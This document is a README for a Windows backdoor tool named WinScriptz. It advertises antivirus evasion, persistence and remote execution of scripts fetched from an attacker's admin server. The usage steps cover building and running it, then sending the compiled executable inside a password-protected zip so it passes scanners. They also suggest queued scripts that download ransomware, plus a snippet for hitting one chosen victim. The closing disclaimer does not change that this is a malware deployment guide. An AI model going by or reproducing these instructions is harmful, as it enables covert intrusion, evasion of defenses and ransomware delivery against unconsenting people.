<p align="center">
  <img src="https://github.com/user-attachments/assets/08ea1e26-1ce6-4917-9391-24f695058475"/>
</p>
<p align="center"><b style="font-size: 30px">WinScriptz: An open-source Windows backdoor enabling remote script execution.</b></p>

## Features  
- **Undetected Execution** – Uses evasion techniques to bypass antivirus detection.  
- **Persistence** – Ensures continued access to the system even after a reboot.  
- **Remote Execution** – Downloads and runs scripts from a centralized admin server.  
- **Custom Scripts** – Supports pre-made and user-defined scripts for executing commands, disabling peripherals, and more.  


WinScriptz works by connecting to an admin server, retrieving queued scripts, and executing them on the remote machine. You can manage and deploy scripts remotely using the `queue-scripts` tool.  

**Note:** Ensure all required libraries are imported into `executor.py` before execution.  

#                                           Installation

Install the python requirements

```sh
python -m pip install -r requirements.txt
```

Start the server

```sh
python app.py
```

Now, compile the file.

```sh
python compile.py
```

#                                           USAGE

The compiled executable can be found in the `dist` directory, I recommend zipping it with a password before sending it to someone.

Once someone has ran your executable you will start to see numerous requests made to your server, you can then run 

```sh
python queue-scripts.py
```

To queue scripts to the remote computers, you can create your own scripts that can perform numerous tasks such as downloading ransomware or disabling a Windows function.

**Note**: The queue-scripts.py must be ran on the server computer to be able to queue scripts.

**Helpful**: To queue scripts on a single computer you can put the script inside the following code block.

```py
import os
if 'JohnKennedy' == os.getlogin():
  # Script code here
```

'JohnKennedy' is the name of the user, it can be found in the `replies` directory.


#                                           DISCLAIMER

This software is intended **solely for ethical use** and should only be deployed on systems where you have **explicit authorization** from the owner. Unauthorized access, execution, or modification of remote systems without consent is **illegal** and may violate **cybercrime laws** in multiple jurisdictions.

I am **NOT** responsible for any misuse, damage, or legal consequences arising from the use of this tool. **Use it at your own risk** and ensure you have the proper permissions before deploying it.

